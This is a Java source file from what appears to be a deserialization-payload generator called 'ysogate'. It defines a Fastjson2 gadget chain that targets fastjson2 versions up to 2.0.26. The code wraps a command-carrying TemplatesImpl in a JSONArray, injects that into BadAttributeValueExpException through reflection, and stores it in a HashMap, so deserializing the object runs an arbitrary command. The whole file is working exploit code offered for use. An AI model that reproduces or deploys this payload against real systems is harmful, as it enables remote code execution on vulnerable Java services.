package com.h2tg.ysogate.payloads.gadgets;

import com.alibaba.fastjson2.JSONArray;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;
import java.util.HashMap;
import javax.management.BadAttributeValueExpException;

@Dependencies({"com.alibaba.fastjson2:<=2.0.26?"})
public class Fastjson2 implements CommandObjectPayload<Object>
{
    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }
}
